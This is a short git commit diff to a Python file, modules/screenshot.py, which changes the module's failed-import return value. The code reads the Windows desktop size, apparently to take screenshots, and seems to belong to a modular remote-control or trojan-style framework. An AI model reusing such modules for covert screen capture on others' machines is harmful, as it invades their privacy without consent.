043a741b3ec40022fa4e0c7f624d953fdf8b0a99
purple_racc00n <purple_rac00n@localhost.localdomain>
2016-08-04 18:55:29 +0200

    update

--- modules/screenshot.py
+++ modules/screenshot.py
@@ -7,7 +7,7 @@ def run(**args):
 		import win32api
 	except:
 		print "Could not load the module on this host. Skipping."
-		return
+		return 0, "failed"
 	hdesktop = win32gui.GetDesktopWindow()
 	width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
 	height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
